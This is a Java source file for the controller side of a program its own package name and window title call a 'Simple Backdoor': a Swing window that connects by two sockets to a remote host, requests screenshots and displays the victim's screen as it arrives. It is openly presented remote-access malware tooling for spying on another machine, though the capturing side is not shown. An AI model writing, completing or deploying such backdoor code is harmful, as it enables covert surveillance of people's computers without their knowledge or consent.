package net.jaguargaming.backdoor.client;

import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

public class ScreenshareClient extends JFrame {

	/**
	 * 
	 */
	private static final long serialVersionUID = -7201223173972066158L;
	private JPanel contentPane;
	JLabel screen;
	
	Socket s;
	DataInputStream din;
	DataOutputStream dout;
	
	File iconFile;
	File screenshotFile;
	
	Socket s2;
	DataInputStream din2;
	DataOutputStream dout2;
	
	Thread receiveThread;
	boolean receiving;
	
	/**
	 * Create the frame.
	 */
	public ScreenshareClient(String address, int port, int resX, int resY) {
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				try {
					while(receiving)
						Thread.sleep(100);
					receiveThread.interrupt();
					dout.close();
					dout2.close();
					din.close();
					din2.close();
					s.close();
					s2.close();
				} catch (InterruptedException | IOException e) {
					e.printStackTrace();
				}
			}
		});
		setType(Type.UTILITY);
		setResizable(false);
		setTitle("Simple Backdoor - Screenshare");
		setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		setBounds(120, 120, resX, resY);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(null);
		setContentPane(contentPane);
		
		screen = new JLabel("");
		screen.setBounds(0, 0, resX, resY);
		contentPane.add(screen);
		
		try {
			s = new Socket(address, port);
			s2 = new Socket(address, 6766);
			din = new DataInputStream(s.getInputStream());
			din2 = new DataInputStream(s2.getInputStream());
			dout = new DataOutputStream(s.getOutputStream());
			dout2 = new DataOutputStream(s2.getOutputStream());
			screenshotFile = new File(System.getProperty("user.home") + "/screenshot.png");
			if (!screenshotFile.exists())
				screenshotFile.createNewFile();
			iconFile = new File(System.getProperty("user.home") + "/iconscreenshot.png");
			if (!iconFile.exists())
				iconFile.createNewFile();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		receiveThread = new Thread(new Runnable() {

			@Override
			public void run() {
				while (true) {
					try {
						if (din2.readUTF().equalsIgnoreCase("start screenshot send")) {
							receiving = true;
							say("screenshot receive ready");
							byte b[]=new byte [1024];
							FileOutputStream fos = new FileOutputStream(screenshotFile, false);
							long bytesRead;
							do {
								bytesRead = din.read(b, 0, b.length);
								fos.write(b, 0, b.length);
							} while (!(bytesRead < 1024));
							fos.flush();
							fos.close();
							receiving = false;
							Path ssPath = FileSystems.getDefault().getPath(screenshotFile.getAbsolutePath(), "");
							Path icnPath = FileSystems.getDefault().getPath(iconFile.getAbsolutePath(), "");
							Files.copy(ssPath, icnPath, StandardCopyOption.REPLACE_EXISTING);
							screen.setIcon(new ImageIcon(ImageIO.read(iconFile)));
							screen.repaint();
							repaint();
							say("received");
						}
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
			
		});
		receiveThread.start();
	}
	
	private void say(String s) throws IOException {
		try {
			dout2.writeUTF(s);
			dout2.flush();
		} catch (IOException e) {
			throw e;
		}
	}
}
